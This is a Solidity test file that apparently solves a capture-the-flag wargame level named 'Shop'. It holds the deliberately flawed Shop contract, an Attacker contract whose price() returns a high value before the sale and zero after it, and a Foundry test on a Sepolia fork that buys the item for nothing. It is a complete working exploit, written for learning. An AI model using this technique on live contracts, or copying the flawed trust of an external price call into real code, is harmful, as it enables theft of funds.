// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Attacker {
    Shop public shop = Shop(0x4365e184ec2273FE595cEdAE003A05B6c16FA203);
    function price() public view returns (uint){
        if (shop.isSold()){ // shop's intermediate state is visible to the buyer
            return 0;
        }
        return 1000;
    }
    function attack() public {
        shop.buy();
    }
}

contract ShopTest is Test {
  function setUp() public {
      vm.createSelectFork("sepolia", 5452694);
  }

  function test_shop() public {
    Shop shop = Shop(0x4365e184ec2273FE595cEdAE003A05B6c16FA203);
    Attacker attacker = new Attacker();
    attacker.attack();
    uint price = shop.price();
    require(shop.isSold(), "ShopTest: should be sold");
    require(price == 0, "ShopTest: price should be 0");
  }
}
